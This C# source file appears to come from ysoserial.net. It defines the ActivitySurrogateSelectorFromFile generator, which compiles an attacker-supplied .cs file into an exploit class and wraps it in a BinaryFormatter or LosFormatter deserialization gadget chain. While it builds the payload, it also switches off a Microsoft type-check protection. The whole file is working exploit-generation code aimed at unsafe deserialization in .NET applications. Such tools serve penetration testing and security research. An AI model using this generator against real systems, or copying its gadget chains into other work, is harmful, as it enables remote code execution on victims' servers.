using NDesk.Options;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    [Serializable]
    public class PayloadClassFromFile : PayloadClass
    {
        protected PayloadClassFromFile(SerializationInfo info, StreamingContext context) : base(info, context)
        {
        }

        public PayloadClassFromFile(string file, int variant_number, InputArgs inputArgs)
        {
            this.variant_number = variant_number;
            this.inputArgs = inputArgs;
            base.assemblyBytes = LocalCodeCompiler.CompileToAsmBytes(file);
        }
    }

    public class ActivitySurrogateSelectorFromFileGenerator : ActivitySurrogateSelectorGenerator
    {
        private int variant_number = 1;

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2 (shorter but may not work between versions)", v => int.TryParse(v, out this.variant_number) },
            };
            return options;
        }

        public override string AdditionalInfo()
        {
            return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
        }

        public override string Name()
        {
            return "ActivitySurrogateSelectorFromFile";
        }
        
        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Disable ActivitySurrogate type protections during generation
            System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");

            try
            {
                PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd, variant_number, inputArgs);

                if (inputArgs.Minify)
                {
                    byte[] payloadInByte = payload.GadgetChainsToBinaryFormatter();
                    if (formatter.ToLower().Equals("binaryformatter"))
                    {
                        if (inputArgs.Test)
                        {
                            try
                            {
                                SerializersHelper.BinaryFormatter_deserialize(payloadInByte);
                            }
                            catch (Exception err)
                            {
                                Debugging.ShowErrors(inputArgs, err);
                            }
                        }

                        return payloadInByte;
                    }
                    else if (formatter.ToLower().Equals("losformatter"))
                    {
                        payloadInByte = Helpers.ModifiedVulnerableBinaryFormatters.SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(payload.GadgetChainsToBinaryFormatter());

                        if (inputArgs.Test)
                        {
                            try
                            {
                                SerializersHelper.LosFormatter_deserialize(payloadInByte);
                            }
                            catch (Exception err)
                            {
                                Debugging.ShowErrors(inputArgs, err);
                            }
                        }
                        return payloadInByte;
                    }
                }    
                return Serialize(payload, formatter, inputArgs);
            }
            catch(System.IO.FileNotFoundException e1)
            {
                Console.WriteLine("Error in provided file(s): \r\n" + e1.Message);
                return "";
            }
            
        }
    }
}
